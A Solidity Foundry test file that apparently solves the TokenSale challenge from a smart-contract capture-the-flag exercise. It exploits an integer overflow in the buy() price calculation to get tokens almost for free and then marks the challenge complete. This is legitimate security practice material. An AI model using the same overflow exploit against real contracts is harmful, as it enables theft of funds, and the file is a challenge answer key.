// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {TokenSale} from "../src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSale public tokenSale;
    address challenger;

    function setUp() public {
        //setup a payable address as a challenger
        challenger = vm.addr(1);
        vm.deal(challenger, 10 ether);

        tokenSale = new TokenSale{value: 1 ether}();
        vm.startPrank(challenger);
    }

    function test_solution() public {
        //uint256(-1) / PRICE_PER_TOKEN + 1
        uint256 tokenNumOverflow = 115792089237316195423570985008687907853269984665640564039458;
        //tokenNumOverflow * PRICE_PER_TOKEN - 2^256 (uint256 overflow)
        uint256 Wei = 415992086870360064;
        //make it overflow
        tokenSale.buy{value: Wei}(tokenNumOverflow);
        tokenSale.sell(1);
        assertEq(tokenSale.isComplete(), true);
    }
}